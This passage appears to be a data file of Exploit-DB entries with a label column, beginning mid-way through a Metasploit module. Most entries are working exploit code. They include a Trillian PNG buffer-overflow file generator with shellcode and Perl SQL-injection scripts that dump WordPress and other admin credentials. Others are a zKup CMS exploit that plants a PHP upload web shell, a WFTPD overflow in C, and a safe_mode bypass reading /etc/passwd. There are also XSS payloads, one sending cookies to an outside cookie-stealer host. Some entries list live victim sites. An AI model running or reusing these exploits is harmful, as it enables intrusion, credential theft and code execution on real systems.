SP0-SP4 English',       { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Fortinet FortiReporter (OEM) Offset 1262 Windows XP English SP1/SP2',         { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Fortinet FortiReporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1',{ 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['iPolicy Security Reporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',    { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['iPolicy Security Reporter (OEM) Offset 1262 Windows XP English SP1/SP2',          { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['iPolicy Security Reporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows 2000 SP0-SP4 English', { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows XP English SP1/SP2',   { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['SanMina Viking Multi-Log Manager (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows 2000 SP0-SP4 English',   { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows XP English SP1/SP2',     { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Secure Computing G2 Security Reporter (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows 2000 SP0-SP4 English',          { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows XP English SP1/SP2',            { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Top Layer Network Security Analyzer (OEM) Offset 1262 Windows Server 2003 English SP0/SP1',   { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Jul 24 2006' 			))  		register_options( 			[ 				Opt::RPORT(10616) 			], self.class) 	end  	def exploit 		connect  		print_status(""Trying target #{target.name}..."")  		filler =  rand_text_english(1) * (target['Offset'] - payload.encoded.length) 		sploit =  ""LICMGR_ADDLICENSE&"" + filler + payload.encoded + [target.ret].pack('V') +  ""&"";  		sock.put(sploit)  		handler 		disconnect 	end  end",eIQnetworks Enterprise Security,1
25181,"Cerulean Studios Trillian 3.0 - Remote '.png' Image File Parsing Buffer Overflow source: https://www.securityfocus.com/bid/12703/info  A remote buffer overflow vulnerability affects Cerulean Studios Trillian. This issue is due to a failure of the application to securely copy image data into finite process buffers.  An attacker may leverage this issue to execute arbitrary code with the privileges of an unsuspecting user that activated the vulnerable application.   ######################################### #                                                                                        # #                      See-security Technologies ltd.                       # #                                                                                        # #                      http://www.see-security.com                         # #                                                                                        # ######################################### #                                                                                        # #   Trillian 3.0 PNG Image Processing Buffer overflow Exploit   # #                                                                                        # #                                                                                        # #                Discovered and coded by: Tal zeltzer                   # #                                                                                        # #########################################  import sys import struct  # Addresses are compatible with Windows XP Service Pack 1 ReturnAddress = 0x77D7A145 # Address of ""jmp esp"" in ntdll.dll  SystemAddress = 0x77C28044 # Address Of the system() function  # PNG Header PngOfDeath = ""\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52"" PngOfDeath += ""\x00\x00\x00\x40\x00\x00\x00\x40\x08\x03\x00\x00\x00\x9D\xB7\x81"" PngOfDeath += ""\xEC\x00\x00\x01\xB9\x74\x52\x4E\x53""  # Nops PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90""  # system(calc) shellcode PngOfDeath += ""\x33\xC0\x50\x68\x63\x61\x6c\x63\x54\x5b\x50\x53\xb9"" PngOfDeath += struct.pack(""<L"",SystemAddress) PngOfDeath += ""\xFF\xD1""  # Junk Data PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" PngOfDeath += ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""  # Return Address PngOfDeath += struct.pack(""<L"",ReturnAddress)  # Jump Back Shellcode PngOfDeath += ""\x54\x59\xFE\xCD\x89\xE5\xFF\xE1""  # End Of File PngOfDeath += ""\x90\x90\x90\x59\xE8\x47\xFE\xFF\xFF""  fileOut = open(""Trillian.png"",""wb"") fileOut.write(PngOfDeath) fileOut.close()",Cerulean Studios Trillian,1
27596,"PHP 4.x - 'copy() Safe_Mode' Bypass source: https://www.securityfocus.com/bid/17439/info   PHP is prone to multiple 'safe_mode' and 'open_basedir' restriction-bypass vulnerabilities. Successful exploits could allow an attacker to access sensitive information or to write files in unauthorized locations.   These vulnerabilities would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code, when the 'safe_mode' and 'open_basedir' restrictions are expected to isolate the users from each other.   These issues are reported to affect PHP versions 4.4.2 and 5.1.2; other versions may also be vulnerable.  copy(""compress.zlib:///etc/passwd"", ""/home/<username>/passwd.txt"");",PHP,1
11733,"PHPpool media Domain Verkaufs und Auktions Portal - 'index.php' SQL Injection ----------------------------Information------------------------------------------------ +Name : phppool media Domain Verkaufs und Auktions Portal index.php SQL Injection +Autor : Easy Laster +Date   : 14.03.2010 +Script  : phppool Domain Verkaufs und Auktions Portal  +Language :PHP +Discovered by Easy Laster +Security Group 4004-Security-Project +Greetz to Team-Internet ,Underground Agents +And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok, Kiba,-tmh-,Dr Chaos,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge, N00bor,Damian,novaca!ne.  ---------------------------------------------------------------------------------------                                                                                        ___ ___ ___ ___                         _ _           _____           _         _    | | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_  |_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|   |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|                                                 |___|                 |___|               ---------------------------------------------------------------------------------------- +Vulnerability : http://www.site.com/portal/index.php?a=d&id= +Exploitable   : http://www.site.com/portal/index.php?a=d&id=-11111111111+union+select +1,2,concat(firstname,0x3a,password,0x3a,email),4,5,6,7,8,9,10,11+from+dsp_buyers-- -----------------------------------------------------------------------------------------",PHPpool media Domain Verkaufs und Auktions Portal,1
43980,"Student Profile Management System Script 2.0.6 - Authentication Bypass # Exploit title: Student Profile Management System Script 2.0.6 - Admin Panel Authentication Bypass # Dork: ""Powered by: i-Net Solution"" # Date: 2018-02-06 # Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com # Vendor Homepage: https://www.phpscriptsmall.com/product/studentstaff-profile-management-system/ # Version: 2.0.6 # Category: Webapps # CVE: N/A # # # # # # Description: # With this exploit,Attacker can bypass admin panel Authentication. # # # # # # Proof of Concept:  # username : anything # password : admin' or 'a'='a # admin panel login : /admin_login.php",Student Profile Management System Script,1
8088,"Osmodia Bulletin Board 1.x - 'admin.txt' File Disclosure ######################################################### --------------------------------------------------------- Portal Name: Osmodia Bulletin Board Version : All Version Author : Pouya_Server , Pouya.s3rver@Gmail.com Website: http://Pouya-Server.ir --------------------------------------------------------- ######################################################### [Xpl]: http://site/[Path]/members/admin.txt ------------------------------------------ Victem : http://www.a4-freunde.de/foren http://www.kirk1980.de/abiboard http://www.autothieme.de/forum --------------------------------------------------------- #########################################################  # milw0rm.com [2009-02-20]",Osmodia Bulletin Board,1
27840,timobraun Dynamic Galerie 1.0 - 'index.php?pfad' Cross-Site Scripting source: https://www.securityfocus.com/bid/17896/info    Dynamic Galerie is prone to a directory-traversal vulnerability and a cross-site scripting vulnerability. These issues are due to a failure in the application to properly sanitize user-supplied input.     An attacker can exploit these vulnerabilities to retrieve arbitrary files from the vulnerable system in the context of the affected application or to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/index.php?pfad=[XSS],timobraun Dynamic Galerie,1
20794,"WFTPD 3.0 - 'RETR' / 'CWD' Remote Buffer Overflow // source: https://www.securityfocus.com/bid/2644/info  Invalid long strings submitted using either 'RETR' or 'CWD' commands to a host running WFTPD server, will result in the service terminating due to a buffer overflow. It may be possible for an attacker to execute arbitrary code through this vulnerability.  A restart of the server is required in order to gain normal functionality.  This vulnerability has been reported to exist on systems running Windows NT 4.0 with either SP3, SP4, or SP6 installed.  The problem exists due to the interaction between WFTPD.EXE and the Windows function call 'NTDLL.DLL:RtlFreeHeap()'.   /* WFTPD Pro 3.00 R4 Buffer Overflow exploit    written by Len Budney */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <errno.h>  #define BUFSIZE 32774 #define CMD ""RETR ""  /* Alt: use ""CWD "" and set OFFSET to 4. */ #define OFFSET 5 void main(){         int sockfd, s; 	struct sockaddr_in victim;         char buffer[BUFSIZE];         char exploitbuffer[BUFSIZE]={CMD};         char recvbuffer[BUFSIZE];          sockfd=socket(AF_INET,SOCK_STREAM,0); if(sockfd == -1)perror(""socket"");         victim.sin_family=AF_INET;         victim.sin_addr.s_addr=inet_addr(""192.168.197.129"");         victim.sin_port=htons(21);         s=connect(sockfd, (struct sockaddr*) &victim, sizeof(victim));         if(s == -1) perror(""connect"");          recv(sockfd, recvbuffer, sizeof (recvbuffer),0);         memset(recvbuffer, '\0',sizeof(recvbuffer));         send(sockfd, ""USER anonymous\r\n"",strlen (""USER anonymous\r\n""),0);         recv(sockfd, recvbuffer, sizeof (recvbuffer),0);         memset(recvbuffer, '\0',sizeof(recvbuffer));         send(sockfd, ""PASS\r\n"",strlen (""PASS\r\n""),0);         recv(sockfd, recvbuffer, sizeof (recvbuffer),0);         memset(recvbuffer, '\0',sizeof(recvbuffer));          memset(exploitbuffer+OFFSET,0x90,sizeof (exploitbuffer)-OFFSET-2);         sprintf(buffer,""%s\r\n"",exploitbuffer);         send(sockfd, buffer , sizeof(buffer),0);         recv(sockfd, recvbuffer, sizeof (recvbuffer),0);          close(sockfd); 	_exit(0); }",WFTPD.EXE,1
22735,"iDev Rentals 1.0 - Multiple Vulnerabilities Title: ====== iDev Rentals v1.0 - Multiple Web Vulnerabilities   Date: ===== 2012-11-14   References: =========== http://www.vulnerability-lab.com/get_content.php?id=760   VL-ID: ===== 758   Common Vulnerability Scoring System: ==================================== 3.5   Introduction: ============= idev-Rentals is a PHP Script (special software for your website) allows you to create an apartment / housing / accommodation  rentals listing directory. You and your website visitors can add property rentals, upload photos, add property location  information that will display visually on a Google Map embedded plugin. You can choose to charge for listings, or make your  rentals directory entire free for visitors to post their rental listings to. idev-Rentals allows you to service either a broad  or highly targeted region. You can create a worldwide rentals directory or a rentals directory limited to a specific city or region.  You can customize the appearance entirely, add your own graphics, logo, colors, header/footer, and fully integrate idev-Rentals  in to your website! More theme style templates are available from our demo page. When you purchase idev-Rentals, we will deliver  (electronically) to you the files that you will then need to upload to your website in order to run idev-Rentals There is a simple  installation process (that we fully support) (and we also offer a complete installation service, if you need that kind of help) the  entire process can completed in as little as 5 minutes.  You will have full access to an administrative control panel area where you will be able to manage all idev-Rentals functions easily  and without any technical knowledge. All of our website software (PHP Scripts) are designed to be customized fully. We include a good  selection of pre-made professional theme style templates free with purchase (and we are constantly expanding upon our template library).  You will have the option to create your own theme style templates (feel free to share them with the community!) and if you are a  programmer/advanced developer, you will also have full access to our source code, which means that you can literally change anything or  add any features that you might need. Create an Open Rentals Directory Website As a business startup idea, you could be the first in your  area to offer a rentals listings website which is open to visitors to submit their own rental listings. This can be a wonderful money  earning business startup idea since you could then place advertising, or charge for listings on your website.  (Copy of the Vendor Homepage: http://idevspot.com/idev-rentals.php )   Abstract: ========= The Vulnerability Laboratory Research Team discovered multiple Web Vulnerabilities in the idev Rentals v1.0 php rental script.   Report-Timeline: ================ 2012-11-14:	Public Disclosure   Status: ======== Published   Exploitation-Technique: ======================= Remote   Severity: ========= Medium   Details: ======== Multiple persistent input validation vulnerabilities are detected in idev-Rentals 1.0 php rental script.  The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).  The persistent vulnerabilities are located in the add listing, add category and add package module with the  bound vulnerable Title, Caption Description, Location, Category name, package Name and Package Description parameters.  Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent)  context manipulation. Exploitation requires low user inter action & privileged web application user account.   Vulnerable Module(s): 			[+] Add Listing 			[+] Add Category 			[+] Add Package  Vulnerable Parameter(s): 			[+] [Title][Caption][Description] [Location]  			[+] [Category name] 			[+] [Package Name] - [Package Description]   Proof of Concept: ================= The persistent input validation vulnerabilities can be exploited by remote attackers with low or medium privileged application user account  and with low or medium required user inter action. For demonstration or reproduce ...  1.2.1 The remote attacker can add standard listing to inject own malicious persistent script code, >""<iframe src=http://www.vulnerability-lab.com onload=alert(""VL"")</iframe>, in the fields Title, Caption, Description, Location When a admin is processing to view the users listing, the malicious script code will be executed.   URL: http://idevnetwork.127.0.0.1:1336/[PATH]/idev-rentals/index.php?page=account_add  1.2.2  The remote attacker can add category to inject own malicious persistent script code,  >""<iframe src=http://www.vulnerability-lab.com onload=alert(""VL"")</iframe>, in the fields category name. When a user is processing to view the category listing, the malicious script code will be executed.   URL: http://idevnetwork.127.0.0.1:1336/[PATH]/idev-rentals/admin/index.php?page=categories  1.3 The remote attacker can add packages to inject own malicious persistent script code,  >""<iframe src=http://www.vulnerability-lab.com onload=alert(""VL"")</iframe>, in the fields package name or package description When a user is processing to view the packages listing, the malicious script code will be executed.   URL: http://idevnetwork.127.0.0.1:1336/[PATH]/idev-rentals/admin/index.php?page=add_package   Risk: ===== 1.1 The security risk of the persistent input validation vulnerabilities are estimated as medium(+).   Credits: ======== Vulnerability Laboratory  - Ibrahim El-Sayed (the_storm) [storm@vulnerability-lab.com] [iel-sayed.blogspot.com]    Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2012 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",iDev Rentals,1
45499,"ManageEngine Desktop Central 10.0.271 - Cross-Site Scripting # Exploit Title: ManageEngine Desktop Central 10.0.271 - Cross-Site Scripting # Date: 2018-09-11  # Exploit Author: Ismail Tasdelen # Vendor Homepage: https://www.manageengine.com/ # Hardware Link : https://www.manageengine.com/products/desktop-central/ # Software : ZOHO Corp ManageEngine Desktop Central 10 # Product Version: 10.0.271 # Vulernability Type : Cross-site Scripting # Vulenrability : Reflected  # CVE : CVE-2018-16833  # Zoho ManageEngine Desktop Central 10.0.271 has XSS via the ""Features & Articles""  # search field to the /advsearch.do?SUBREQUEST=XMLHTTP URI.   # HTTP Request Header :  POST /advsearch.do?SUBREQUEST=XMLHTTP HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 Accept: */* Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://TARGET/homePage.do?actionToCall=homePageDetails X-Requested-With: XMLHttpRequest Content-type: application/x-www-form-urlencoded;charset=UTF-8 X-ZCSRF-TOKEN: =All Content-Length: 222 Cookie: DCJSESSIONID=34B31AEA87E0A617AB23A607C980CC07; DCJSESSIONIDSSO=0738458E311E15CD1E28F27F1DED5388; dc_customerid=All; summarypage=true; DM_SPDA_LST=1536665909495 Connection: close  q=""><img src=x onerror=alert('ismailtasdelen')>&src=sall&stab=Home&page=1&pagelimit=10&searchParamId=901&searchParamName=dm.advsearch.features.articles&id=1536666162979&isTriggerFromMenu=false&actionToCall=getSearchResults",ManageEngine Desktop Central,1
42772,"Cash Back Comparison Script 1.0 - SQL Injection #!/usr/bin/perl -w # # # # #  # Exploit Title: Cash Back Comparison Script 1.0 - SQL Injection # Dork: N/A # Date: 22.09.2017 # Vendor Homepage: http://cashbackcomparisonscript.com/ # Software Link: http://cashbackcomparisonscript.com/demo/features/ # Demo: http://www.cashbackcomparison.info/ # Version: 1.0 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: CVE-2017-14703 # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Social: @ihsansencan # # # # # sub clear{ system(($^O eq 'MSWin32') ? 'cls' : 'clear'); } clear(); printash Back Comparison Script 1.0 - SQL Injection            ################################################################################ ""; use LWP::UserAgent; print ""\nInsert Target:[http://site.com/path/]: ""; chomp(my $target=<STDIN>); print ""\n[!] Exploiting Progress.....\n""; print ""\n""; $cc=""/*!01116concat*/(0x3c74657874617265613e,0x557365726e616d653a,username,0x20,0x506173733a,password,0x3c2f74657874617265613e)""; $tt=""users""; $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0'); $host = $target . ""search/EfE'+/*!01116UNIoN*/+/*!01116SeLecT*/+0x31,0x32,0x33,0x34,0x35,0x36,"".$cc."",0x38/*!50000FrOm*/"".$tt.""--+-.html""; $res = $b->request(HTTP::Request->new(GET=>$host)); $answer = $res->content; if ($answer =~/<textarea>(.*?)<\/textarea>/){ print ""[+] Success !!!\n""; print ""\n[+] Admin Detail : $1\n""; print ""\n[+]$target/admin/login.php\n""; print ""\n""; } else{print ""\n[-]Not found.\n""; }",Cash Back Comparison Script,1
1033,"WordPress Core 1.5.1.1 - SQL Injection #!/usr/bin/perl -w # # SQL Injection Exploit for WordPress <= 1.5.1.1 # This exploit shows the username of the administrator of the blog and his # password crypted in MD5, you must only choose the correct version of the target # Related advisory: http://www.gentoo.org/security/en/glsa/glsa-200506-04.xml # Patch: download the last version at http://wordpress.org/download/ # Coded by Alberto Trivero  use LWP::Simple;  print ""\n\t====================================\n""; print ""\t= Exploit for WordPress <= 1.5.1.1 =\n""; print ""\t=        by Alberto Trivero        =\n""; print ""\t====================================\n\n"";  if(!$ARGV[0] or !($ARGV[0]=~m/http/) or !($ARGV[1]==1 or $ARGV[1]==2)) {    print ""Usage:\nperl $0 [full_target_path] [target_version: 1 OR 2]\nVersion 1: WordPress <= 1.5\nVersion 2: WordPress 1.5.1 - 1.5.1.1\n\n"";    print ""Examples:\nperl $0 http://www.example.com/wordpress/ 2\n"";    exit(0); }  $page=get($ARGV[0].""index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*"") || die ""[-] Unable to retrieve: $!"" if($ARGV[1]==1); $page=get($ARGV[0].""index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*"") || die ""[-] Unable to retrieve: $!"" if($ARGV[1]==2); print ""[+] Connected to: $ARGV[0]\n""; $page=~m/:([a-f0-9]{32}):(.*?):/; print ""[+] Username of administrator is: $2\n"" if($2); print ""[+] MD5 hash of password is: $1\n"" if($1); print ""[-] Unable to retrieve username\n"" if(!$2); print ""[-] Unable to retrieve hash of password\n"" if(!$1);  # milw0rm.com [2005-06-22]",WordPress Core,1
5220,"zKup CMS 2.0 < 2.3 - Arbitrary File Upload #!/usr/bin/php <?php /*  * Name:    zKup CMS v2.0 <= v2.3 0-day exploit (upload)  * Credits: Charles ""real"" F. <charlesfol[at]hotmail.fr>  * Date:    03-08-2008  * Conditions: PHP Version, magic_quotes_gpc=Off  *  * This exploit spawn a php uploader in your victim's  * server.  *  * Okay, you may need explanations:  *  * First, we can use administration without being admin  * (see ./admin/configuration/modifier.php)  *  * Then, when we add an admin, it is saved in a php file,  * named ""./fichiers/config.php"".  * A vuln is present when the script controls $login value,  * because it use this regex: #^[a-zA-Z0-9]+$#  * in order to see if it's alphanumerical.  * I bypassed this regex using a NULL POISON BYTE (%00),  * and writing my upload script just after.  * I finally put some lines in order not to  * corrupt config.php.  *  */  print ""\n""; print ""   zKup CMS v2.0 <= v2.3 0-day exploit (upload)\n""; print ""       by Charles \""real\"" F. <charlesfol[at]hotmail.fr>\n\n"";  if($argc<2) { print ""usage: php zkup2_upload_exploit.php <url>\n   eg: php zkup2_upload_exploit.php http://127.0.0.1/votresite/"";exit(-1); } $url = $argv[1];  $code = ' if(isset($_POST[\'upload\'])) {     if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], ""./"".$_FILES[\'file\'][\'name\'])) exit(""<center>Error (move_uploaded_file)</center>"");     else echo ""<center>File uploaded</center>""; } if($_GET[\'up\']==1) { ?> <form method=""post"" enctype=""multipart/form-data""> <center> <input type=""file"" name=""file""> <input type=""submit"" name=""upload"" value=""Upload""> </center> </form> <?php } '; $code = urlencode($code);  /* Not to compromise config.php work */ $restore = array(); $restore[0] = 'admin'.rand(100,200).'%00"",""mdp""=>""436ae61e82a236bd4771e184a556bf65"",""lvl""=>9);'; $restore[1] = '$tAdmin[] = array(""login""=> ""admin'.rand(200,300);  $postit = ""action=ajout&login=$restore[0]$code$restore[1]&mdp=real&mdp2=real&lvl=9"";  print ""[*] sending evil c0de ... ""; if(preg_match(""#alert#i"",post($url.""admin/configuration/modifier.php"",""$postit""))) print ""done.\n[*] upload script: "".$url.""fichiers/config.php?up=1\n""; else print ""failed.\n"";  function post($url,$data,$get=1) { 	$result = ''; 	preg_match(""#^http://([^/]+)(/.*)$#i"",$url,$info); 	$host = $info[1]; 	$page = $info[2]; 	$fp = fsockopen($host, 80, &$errno, &$errstr, 30); 	 	$req  = ""POST $page HTTP/1.1\r\n""; 	$req .= ""Host: $host\r\n""; 	$req .= ""User-Agent: Mozilla Firefox\r\n""; 	$req .= ""Connection: close\r\n""; 	$req .= ""Content-type: application/x-www-form-urlencoded\r\n""; 	$req .= ""Content-length: "".strlen( $data ).""\r\n""; 	$req .= ""\r\n""; 	$req .= $data.""\r\n"";  	fputs($fp,$req); 	 	if($get) while(!feof($fp)) $result .= fgets($fp,128); 	 	fclose($fp); 	return $result; }  ?>  # milw0rm.com [2008-03-07]",zKup CMS,1
20736,"SCO Open Server 5.0.6 - lpforms Buffer Overflow source: https://www.securityfocus.com/bid/2554/info  SCO OpenServer 5.0.6 (and possibly earlier versions) ships with several suid bin executables used in printer administration and related tasks.  This includes lpforms, a component used to manage and configure print destinations, devices and printer interface programs.  'lpforms' contains a locally exploitable buffer overflow vulnerability. If a command line parameter argument is of excessive length, a stack overflow condition will occur.  An attacker may exploit this vulnerability execute arbitrary code with effective user 'bin' privileges.   /opt/K/SCO/Unix/5.0.6Ga/usr/lib/lpforms `perl -e 'print ""A"" x 7000'`  Memory fault - core dumped",SCO Open Server,1
41486,"WordPress Plugin NewStatPress 1.2.4 - Cross-Site Scripting Source: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_the_wordpress_newstatpress_plugin.html  Abstract A persistent Cross-Site Scripting (XSS) vulnerability has been found in the WordPress NewStatPress plugin. By using this vulnerability an attacker can inject malicious JavaScript code into the application, which will execute within the browser of any user who views the relevant application content.  Contact For feedback or questions about this advisory mail us at sumofpwn at securify.nl  The Summer of Pwnage This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.  OVE ID OVE-20160712-0030  Tested versions This issue was successfully tested on WordPress NewStatPress plugin version 1.2.4.  Fix This issue has been addressed in NewStatPress version 1.2.5. This version can be download from the NewStatPress GitHub account: https://github.com/lechab/newstatpress#125  Introduction The WordPress NewStatPress plugin is a real-time plugin to manage the visits' statistics on a WordPress site. It doesn't require external web analytics. A persistent Cross-Site Scripting vulnerability has been discovered in the WordPress NewStatPress plugin which allows an unauthenticated attacker to inject malicious JavaScript code into the application, which will execute within the browser of any user who views the relevant application content. The attacker-supplied code can perform a wide variety of actions, such as stealing victims' session tokens or login credentials, performing arbitrary actions on their behalf, and logging their keystrokes or deliver malware.  Details The WordPress NewStatPress plugin fails to sufficiently check input supplied to a GET request for a resource on a WordPress site with a vulnerable version of the NewStatPress plugin. In addition input supplied to the Referer header is insufficiently sanitized. As a result a malicious request will be stored on the Last Visitors and Visitors tab of the Visits page, executing the payload when an unsuspecting user views one of the mentioned tabs on this page.  Persistent Cross-Site Scripting vulnerabilities are typically more serious than reflected vulnerabilities because they do not require a separate delivery mechanism in order to reach target users, in this case potentially a WP admin reviewing the stats.  Proof of concept This vulnerability can be demonstrated by submitting the following request:  GET /sumofpwn/""><script>alert(document.cookie);</script> HTTP/1.1 Host: 192.168.28.129 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla Chrome/51.0.2704.103 Safari/537.36 Referer: javascript:document.location=`http://www.XXXXXXyourhackerdomainXXXXXX.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie); Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate, sdch Accept-Language: en-US,en;q=0.8,nl;q=0.6 Connection: close  Based on the above request, the vulnerable output will be:  1) <a href=""/?/sumofpwn/\""><script>alert(document.cookie);</script>"" target=""_blank"">/sumofpwn/\""><script>alert(document.cookie);</script></a> 2) Arrived from <a href=""javascript:document.location=`http://www.sfylabs.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);"" target=""_blank"">javascript:document.location=`http://www.sfylabs.nl/demo/xss/cookiestealer.php?c=`+encodeURIComponent(document.cookie);</a>  http://yourhost/wp-admin/admin.php?page=nsp_main http://yourhost/wp-admin/admin.php?page=nsp_visits",WordPress Plugin NewStatPress,1
28032,MPCS 0.2 - 'comment.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/18470/info  MPCS is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/comment.php?pageid=12 <script src=http://www.youfucktard.com/xss.js></script>,MPCS,1
